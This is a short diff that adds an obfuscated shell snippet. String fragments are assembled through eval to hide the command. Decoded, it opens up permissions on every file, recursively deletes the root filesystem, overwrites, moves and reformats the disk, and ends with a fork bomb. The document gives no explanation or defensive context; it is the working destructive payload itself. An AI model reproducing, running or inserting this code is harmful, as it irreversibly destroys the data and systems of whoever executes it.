@@ -1,0 +1,3 @@
+z="
+";Tz='/dev';az=' mkf';Az='sudo';Pz='if=/';Uz='/sda';Gz='do r';Mz='ve-r';gz=' |: ';Fz='; su';Ez='7 /*';Zz='ll; ';Rz='null';Yz='v/nu';Hz='m -r';fz=') {:';Nz='oot;';Oz=' dd ';Xz=' /de';cz='t3 /';bz='s.ex';dz='sda;';Lz='eser';Dz='R 77';hz='&} ;';ez=' : (';Jz=' --n';Iz='f /*';Kz='o-pr';Cz='od -';Sz=' of=';iz=':';Vz='do m';Qz='dev/';Bz=' chm';Wz='v /*';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Fz$Vz$Wz$Xz$Yz$Zz$Az$az$bz$cz$Qz$dz$ez$fz$gz$hz$iz"
